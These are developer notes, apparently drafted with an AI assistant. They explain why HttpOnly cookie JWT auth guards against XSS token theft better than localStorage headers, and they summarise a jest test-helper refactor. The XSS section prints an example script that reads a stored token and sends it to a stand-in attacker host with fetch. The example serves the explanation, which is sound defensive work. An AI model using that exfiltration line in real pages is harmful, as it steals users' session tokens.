# Why Cookie-Based Auth is Safer

## Initial notes:

We implemented cookie-based authentication so the server accepts JWTs via cookies for the user sessions, versus previously we were using it on the request headers.

> Why is the current approach safer?

I understood that the fact that we now pass cookie parser on `backend/src/index.ts` and app context at Apollo allows us to simply `req.cookies` when getting users on the `getUser` function in `backend/src/middleware/auth.ts` 

## The Core Security Difference

| **Authorization Header** | **HttpOnly Cookie** |
|--------------------------|---------------------|
| Stored in JavaScript memory (localStorage/sessionStorage) | Stored by browser, **inaccessible to JavaScript** |
| Vulnerable to XSS attacks | **Protected from XSS** |
| Must be manually attached to every request | Automatically sent by browser |
| Can be stolen via `document.cookie` or JS injection | `HttpOnly` flag prevents JS access |

## The XSS Attack Vector

With **Authorization header** (old approach):
```javascript
// Attacker injects this script via XSS vulnerability
const token = localStorage.getItem('token');
fetch('https://evil.com/steal?token=' + token); // Token stolen!
```

With **HttpOnly cookie** (current approach):
```javascript
// Attacker's script runs, but...
document.cookie; // Returns nothing - HttpOnly cookies are invisible to JS
// Token is SAFE even if XSS occurs
```

## Additional Cookie Security Features

My implementation uses:
- **`HttpOnly`** - JS can't read it
- **`SameSite=Strict`** - Prevents CSRF (cookie only sent from same origin)
- **`Secure`** (in production) - Only sent over HTTPS
- **CORS origin whitelist** - Double protection against cross-origin attacks

### My Understanding was Correct

The flow is:
1. `cookieParser()` middleware parses the `Cookie` header
2. Populates `req.cookies` object
3. `getUser(req)` in `backend/src/middleware/auth.ts` reads `req.cookies.token`
4. Apollo context receives the decoded user

---

## Summary

**All tasks complete.** Here's what was done:

### 1. Cookie-Based Auth Security Explanation

The key security win: **Even if an attacker injects malicious JS via XSS, they cannot steal the token** because `HttpOnly` cookies are invisible to JavaScript.

### 2. Test Helper Refactoring

- **Moved** testApp.ts from `__tests__/helpers/testApp.ts` → `src/test-helpers/testApp.ts`
- **Updated import** in `cookieAuthE2E.test.ts` to use new path
- **Deleted** the old file with dummy test
- **Updated** `jest.config.js` with `testPathIgnorePatterns` to exclude helper directories:
  ```javascript
  testPathIgnorePatterns: [
    '/node_modules/',
    '<rootDir>/src/__tests__/helpers/',
    '<rootDir>/src/test-helpers/'
  ],
  ```

### Test Results
- ✅ **86 tests passing** across 7 test suites.